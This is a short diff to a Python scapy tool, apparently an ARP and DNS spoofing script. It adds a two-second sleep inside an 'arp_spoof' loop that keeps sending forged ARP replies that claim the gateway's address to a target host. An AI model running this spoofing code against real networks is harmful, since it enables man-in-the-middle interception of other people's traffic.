@@ -9,6 +9,7 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import srp
 from threading import Thread
+from time import sleep
 
 
 def process_args() -> Tuple[str, str, str]:
@@ -65,6 +66,8 @@ def arp_spoof(target_mac: str, target_ip: str, gateway: str) -> None:
     while True:
         pkt = ARP(op=2, pdst=target_ip, psrc=gateway, hwdst=target_mac)
         send(pkt, verbose=False)
+        sleep(2)
+
 
 
 def main() -> None:
